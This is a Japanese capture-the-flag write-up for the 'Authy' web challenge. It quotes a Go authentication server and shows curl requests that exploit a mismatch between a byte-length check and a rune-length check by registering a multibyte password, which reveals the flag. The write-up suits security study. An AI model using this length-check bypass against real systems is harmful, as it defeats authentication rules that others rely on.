# Authy:WEB:50pts
I have just learned Golang and trying to build a small authentication platform with it. It's a simple API so it should be secure right ?  

[http://a769a62b4442de42d315a.playat.flagyard.com](http://a769a62b4442de42d315a.playat.flagyard.com)  

[challenge-files-e8024110-c9af-462a-810d-736112066f55.zip](challenge-files-e8024110-c9af-462a-810d-736112066f55.zip)  

# Solution
URLとzipが渡される。  
zipのパスワードは`flagyard`のようで、展開するとソースコードが入っている。  
server.goは以下のようであった。  
```go
~~~
func main() {
	e := echo.New()

	// e.Use(middleware.Logger())
	e.Use(middleware.Recover())

	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{"*"},
		AllowMethods: []string{echo.GET, echo.POST},
	}))

	e.POST("/login", controllers.LoginController)
	e.POST("/registration", controllers.Registration)
	s := &http.Server{
		Addr:         ":1323",
		ReadTimeout:  20 * time.Minute,
		WriteTimeout: 20 * time.Minute,
	}
	e.Logger.Fatal(e.StartServer(s))
}
```
`/login`と`/registration`があり、controllerに実装があるようだ。  
controller/LoginController.goは以下のようであった。  
```go
~~~
func Registration(c echo.Context) error {
	var user models.Users
	body, _ := io.ReadAll(c.Request().Body)
	err := json.Unmarshal(body, &user)
	if err != nil {
		return err
	}
	if len(user.Password) < 6 {
		log.Error("Password too short")
		resp := c.JSON(http.StatusConflict, helper.ErrorLog(http.StatusConflict, "Password too short", "EXT_REF"))
		return resp
	}
	DB := db.DB()
	var count int
	sqlStatement := `Select count(username) from users where username=?`
	err = DB.QueryRow(sqlStatement, user.Username).Scan(&count)
	if err != nil {
		log.Error(err.Error())
	}
	if count > 0 {
		log.Error("username already used")
		resp := c.JSON(http.StatusConflict, helper.ErrorLog(http.StatusConflict, "username already used", "EXT_REF"))
		return resp
	}
	//hashing password (even it's a CTF, stick to the good habits)
	hash, err := bcrypt.GenerateFromPassword([]byte(user.Password), 5)
	if err != nil {
		resp := c.JSON(http.StatusInternalServerError, helper.ErrorLog(http.StatusInternalServerError, " Error While Hashing Password", "EXT_REF"))
		return resp
	}
	user.Password = string(hash)
	user.DateCreated = helper.DateTime()
	user.Token = helper.JwtGenerator(user.Username, user.Firstname, user.Lastname, os.Getenv("SECRET"))
	stmt, err := DB.Prepare("Insert into users (username,firstname,lastname,password,token,datecreated) VALUES (?,?,?,?,?,?)")
	if err != nil {
		resp := c.JSON(http.StatusInternalServerError, helper.ErrorLog(http.StatusInternalServerError, "Error when prepare statement : "+err.Error(), "EXT_REF"))
		return resp
	}
	_, err = stmt.Exec(user.Username, user.Firstname, user.Lastname, user.Password, user.Token, user.DateCreated)
	if err != nil {
		log.Error(err)
		resp := c.JSON(http.StatusInternalServerError, helper.ErrorLog(http.StatusInternalServerError, "Error when execute statement : "+err.Error(), "EXT_REF"))
		return resp
	}
	resp := c.JSON(http.StatusOK, user)
	log.Info()
	return resp
}

type Flag struct {
	Flag string `json:"flag"`
}

func LoginController(c echo.Context) error {
	var user models.Users
	payload, _ := io.ReadAll(c.Request().Body)
	err := json.Unmarshal(payload, &user)

	if err != nil {
		log.Error(err)
		return err
	}
	var result models.Users
	DB := db.DB()
	sqlStatement := "select * from users where username=?"

	err = DB.QueryRow(sqlStatement, user.Username).Scan(&result.Username, &result.Firstname, &result.Lastname, &result.Password, &result.Token, &result.DateCreated)
	if err != nil {
		log.Error(err)
		resp := c.JSON(http.StatusInternalServerError, helper.ErrorLog(http.StatusInternalServerError, "Invalid Username", "EXT_REF"))
		return resp
	}

	err = bcrypt.CompareHashAndPassword([]byte(result.Password), []byte(user.Password))
	if err != nil {
		log.Error("Invalid Password :", err)
		resp := c.JSON(http.StatusInternalServerError, helper.ErrorLog(http.StatusInternalServerError, "Invalid Password", "EXT_REF"))
		return resp
	}
	password := []rune(user.Password)
	result.Token = helper.JwtGenerator(result.Username, result.Firstname, result.Lastname, os.Getenv("SECRET"))
	if len(password) < 6 {
		flag := os.Getenv("FLAG")
		res := &Flag{
			Flag: flag,
		}
		resp := c.JSON(http.StatusOK, res)
		log.Info()
		return resp
	}
	resp := c.JSON(http.StatusOK, result)
	log.Info()
	return resp
}
```
ユーザ登録時のパスワードは6文字以上である必要があるが、6文字未満のパスワードでログインした場合のみフラグが表示される。  
一見すると矛盾しているが、`LoginController`で`password := []rune(user.Password)`していることがわかる。  
`Registration`の`len`ではバイト数が返るのに対し、こちらでは文字数が返される。  
つまり、6バイト以上で6文字未満になるものをパスワードとすればよい。  
日本人なので以下のように行う。  
```bash
$ curl -X POST http://a769a62b4442de42d315a.playat.flagyard.com/registration -d '{"username": "Satoki", "password": "さとき"}'
{"username":"Satoki","password":"$2a$05$3slgG76z4eo1tMBp5sunkuqW5rpAgYkj6RfXnsMMjilEdi.glJyHa","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaXJzdG5hbWUiOiIiLCJsYXN0bmFtZSI6IiIsInVzZXJuYW1lIjoiU2F0b2tpIn0.6C9uCVRQzP833N4uXdwGTBPVmCmUeDW-hODKgEV_FdQ","date_created":"2023-10-09 09:32:58"}
$ curl -X POST http://a769a62b4442de42d315a.playat.flagyard.com/login -d '{"username": "Satoki", "password": "さとき"}'
{"flag":"BHFlagY{43ef8a7241d47ce611eb5d42f1672b6b}"}
```
flagが得られた。  

## BHFlagY{43ef8a7241d47ce611eb5d42f1672b6b}